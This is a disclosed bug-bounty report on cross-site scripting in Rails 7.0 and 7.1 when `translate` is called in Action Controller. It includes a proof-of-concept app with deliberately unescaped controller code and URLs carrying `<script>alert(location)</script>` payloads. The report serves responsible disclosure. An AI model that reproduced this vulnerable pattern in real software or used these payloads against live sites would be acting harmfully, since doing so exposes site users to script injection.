# XSS when using `translate` in Action Controller (Rails 7.0, 7.1)

## Report Details
- **Report ID**: 2303609
- **URL**: https://hackerone.com/reports/2303609
- **State**: Closed
- **Severity**: low
- **Submitted**: 2024-01-04T06:51:32.250Z
- **Disclosed**: 2024-10-01T13:27:12.830Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
I have confirmed two ways that XSS can occur when using `translate` in Action Controller. ( https://github.com/rails/rails/blob/v7.1.2/actionpack/lib/abstract_controller/translation.rb#L15 )
This does not occur in Action View because the implementation of `tanslate` is different. ( https://github.com/rails/rails/blob/v7.1.2/actionview/lib/action_view/helpers/translation_helper.rb#L73 )


One is when the key value contains `_html` and also contains the tag value. 
XSS is possible because the error message returned by `I18n` contains the value of key and is marked as `html_safe`.
https://github.com/rails/rails/blob/v7.1.2/activesupport/lib/active_support/html_safe_translation.rb#L35

The other case is when the key value contains `_html` and the value passed as `default` is not escaped. This was fixed in Action View as [CVE-2020-15169](https://github.com/advisories/GHSA-cfjv-5498-mph5), but it is not modified on the Action Controller side.


## PoC

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new rails_server -G -M -O -C -A -J -T 
# Rails 7.1.2

❯ cd rails_server
```

`config/routes.rb`

```ruby
Rails.application.routes.draw do
   get "/articles/missing_key", to: "articles#missing_key"
   get "/articles/default", to: "articles#default"
end
```

`app/controllers/articles_controller.rb`

```ruby
class ArticlesController < ApplicationController

  def missing_key  
    @message = t(params[:text])
    render :show
  end

  def default  
    @message = t("message_html", default: "<script>alert(location)</script>")
    render :show
  end
end
```

`app/views/articles/show.html.erb`

```html
<h1><%= @message %></h1>

<%# Confirm translate is escape in Action View %>
<p><%= t("<script>alert(location)</script>_html") %></p>
<p><%= t("message_html", default: "<script>alert(location)</script>") %></p>
```

start server

```
❯ bundle exec rails s
```

You can confirm the XSS by accessing the URL below.

- http://127.0.0.1:3000/articles/missing_key?text=%3Cscript%3Ealert(location)%3C/script%3E_html
- http://127.0.0.1:3000/articles/default

## Impact

XSS occurs if pass an untrusted value to `translate` in the controller.

I confirmed that it occurs in versions 7.1 and 7.0, but the XSS did not occur in 6.1.
I'm guessing it's an effect of this commit. https://github.com/rails/rails/commit/a5247bb90895f843c45fb095a4072e8ef30eaa4e

## Attachments
No attachments
